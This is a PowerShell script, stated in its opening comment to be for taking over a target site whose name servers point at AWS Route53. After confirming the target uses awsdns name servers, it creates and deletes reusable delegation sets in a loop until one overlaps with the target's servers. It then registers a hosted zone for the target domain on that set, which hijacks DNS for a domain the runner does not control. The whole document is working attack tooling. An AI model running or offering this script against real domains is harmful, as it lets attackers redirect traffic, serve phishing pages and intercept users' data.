# Try and take over a target site whose name server records are in AWS Delegation Sets (DS) in Route53
$myNameServer = 204.74.111.1
# First argument is the endpoint.
$targetsite = $args[0]
if ( $null -eq $targetsite -or $targetsite.Length -eq 0 ) { throw "Failed - no argument supplied" }
$servers = ( Resolve-DnsName -Type NS $targetsite -Server $myNameServer | Where-Object section -eq 'Answer' ).NameHost
if ( $servers -notmatch 'awsdns' ) { throw 'Failed servers aren''t at AWS' }

# Caller reference requires to be different each time. 5 random letters, plus a number, is what I choose.
$randprefix = -join ( 'a'..'z' | Get-Random -Count 5 )

# Check against existing cache.
$cache = Get-R53ReusableDelegationSetList
ForEach ($q in $cache) {
  $qq = Compare-Object $q.NameServers $servers -ExcludeDifferent
  if ( $qq.Count -ne 0 ) {
    break
  }
}

if ($qq.Count -eq 0) {

  $nomatch = $true
  $crumb = 1
  while ($nomatch) {
    Write-Progress "Try number $crumb"
    $q = (New-R53ReusableDelegationSet -CallerReference $randprefix$crumb).DelegationSet
    $qq = Compare-Object $q.NameServers $servers -ExcludeDifferent
    if ( $qq.Count -ne 0 ) {
      break
    }
    Remove-R53ReusableDelegationSet -Id $q.Id -Confirm:$false
    $crumb++
  }

}
New-R53HostedZone -Name $targetsite -CallerReference $($randprefix)Success -DelegationSetId $q.Id
